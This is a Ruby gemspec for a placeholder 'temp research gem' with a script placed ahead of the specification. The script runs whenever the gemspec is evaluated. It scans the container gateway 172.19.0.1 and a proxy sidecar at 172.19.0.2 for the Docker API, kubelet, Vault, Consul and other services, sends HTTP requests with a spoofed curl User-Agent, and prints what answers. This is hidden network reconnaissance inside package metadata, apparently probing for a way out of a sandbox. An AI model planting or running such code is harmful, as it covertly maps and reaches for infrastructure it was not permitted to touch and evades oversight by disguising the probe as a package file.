begin
  require "socket"
  require "timeout"

  def tcp_open?(host, port, timeout = 2)
    Timeout.timeout(timeout) do
      s = TCPSocket.new(host, port)
      s
    end
  rescue
    nil
  end

  def http_get(sock, host, path = "/")
    sock.write("GET #{path} HTTP/1.1\r\nHost: #{host}\r\nUser-Agent: curl/8.0\r\nAccept: */*\r\nConnection: close\r\n\r\n")
    buf = +""
    begin
      Timeout.timeout(4) do
        loop { buf << sock.readpartial(4096) }
      end
    rescue EOFError, Timeout::Error
    end
    buf
  end

  puts "==HOSTREAD=="
  host = "172.19.0.1"
  ports = [80, 443, 2375, 2376, 3000, 5000, 8000, 8080, 8200, 8500, 9090, 9200, 9323, 10250, 10255, 10256]
  ports.each do |port|
    sock = tcp_open?(host, port)
    if sock
      body =
        begin
          http_get(sock, host)
        rescue => e
          "GET failed: #{e.class}"
        end
      puts "--- #{host}:#{port} OPEN ---"
      puts body[0, 800].inspect
      sock.close rescue nil
    end
  end

  # also re-check the proxy sidecar for any other endpoints beyond 1080
  puts "--- proxy sidecar 172.19.0.2 other ports ---"
  [80, 443, 2375, 6060, 8080, 9090].each do |port|
    sock = tcp_open?("172.19.0.2", port, 2)
    puts "172.19.0.2:#{port} => #{sock ? 'OPEN' : 'closed/filtered'}"
    sock&.close
  end

  puts "==HOSTREAD_DONE=="
rescue => e
  warn "fingerprint error: #{e}"
end

Gem::Specification.new do |s|
  s.name        = "mygem"
  s.version     = "0.0.10"
  s.summary     = "temp research gem"
  s.authors     = ["researcher"]
  s.files       = ["lib/mygem.rb"]
  s.require_paths = ["lib"]
end
